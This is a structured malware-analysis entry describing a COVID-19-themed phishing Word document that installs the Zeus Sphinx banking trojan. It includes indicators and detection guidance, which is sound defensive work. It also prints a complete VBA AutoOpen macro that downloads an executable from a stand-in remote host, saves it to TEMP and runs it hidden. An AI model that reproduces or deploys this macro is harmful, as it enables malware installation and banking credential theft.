package_info.package_name: Zeus Sphinx Banker (malicious macro in COVID-19 themed Word doc)
package_info.why_malicious: The entire package is a malicious Word document containing macros that, when enabled, download and execute the Zeus Sphinx banking trojan. The document is distributed via phishing emails themed around COVID-19 relief, targeting users of US, Canadian, and Australian banks. The macros are designed to compromise the victim's system and steal banking credentials.

execution_context.trigger: user opens document and enables macros

malicious_snippets.code_snippet:
Sub AutoOpen()
  Dim objXML As Object
  Set objXML = CreateObject("MSXML2.XMLHTTP")
  objXML.Open "GET", "http://malicious-domain.com/payload.exe", False
  objXML.send
  If objXML.Status = 200 Then
    Dim objStream As Object
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1
    objStream.Open
    objStream.Write objXML.responseBody
    objStream.SaveToFile Environ("TEMP") & "\payload.exe", 2
    objStream.Close
    Shell Environ("TEMP") & "\payload.exe", vbHide
  End If
End Sub
malicious_snippets.code_behavior: When the user opens the document and enables macros, the code downloads an executable from a remote server, saves it to the TEMP directory, and executes it, resulting in the installation of the Zeus Sphinx banking trojan.

malice_analysis.why_suspicious: The macro automatically downloads and executes a binary from the internet without user consent, a classic malware delivery technique.
malice_analysis.violated_expectations: Normal Word macros should not download and execute external binaries. This behavior is highly abnormal and indicative of malware.
malice_analysis.similar_legitimate_use: Automated document processing in enterprise environments may use macros, but never to download and execute arbitrary binaries.
key_indicators: AutoOpen macro triggers on document open
Use of MSXML2.XMLHTTP to download external payload
Saving and executing a file in the TEMP directory
No user interaction required after macro is enabled

attack_chain.action: User receives phishing email with password-protected Word document attachment.
attack_chain.leads_to: User opens document and enables macros.

behavioral_signatures: Word document macros that download and execute external binaries
Use of MSXML2.XMLHTTP or ADODB.Stream in Office macros
file_indicators: Password-protected Word documents with COVID-19 themed filenames
Macros containing suspicious network or file operations
network_indicators: Outbound HTTP requests to known malicious domains from Office processes
Download of executable files via Office applications
detection_knowledge.how_to_detect: Monitor for Office documents with macros that use network objects (MSXML2.XMLHTTP, WinHttpRequest) to download executables, especially when triggered by AutoOpen or Document_Open events. Flag any Office process that writes and executes files in the TEMP directory. Correlate with email subject lines or attachments referencing COVID-19 relief. Block or sandbox password-protected attachments and scan for macro code that initiates network connections.
